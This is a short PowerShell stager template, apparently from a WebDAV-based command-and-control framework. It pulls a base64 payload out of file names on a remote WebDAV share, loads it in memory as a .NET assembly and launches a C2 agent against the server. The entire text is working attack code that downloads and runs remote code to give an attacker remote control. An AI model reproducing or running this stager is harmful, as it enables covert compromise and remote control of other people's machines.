$$ep = (cmd /c "pushd \\${serverName}\agent\ & dir /b /a-d & popd" | Out-String) -replace "`n|`r" -replace "_","/"
$$b = [System.Convert]::FromBase64String($$ep.ToString())
[System.Reflection.Assembly]::Load($$b) | Out-Null
$$p=@("${serverName}")
[webdavc2.C2_Agent]::Main($$p)
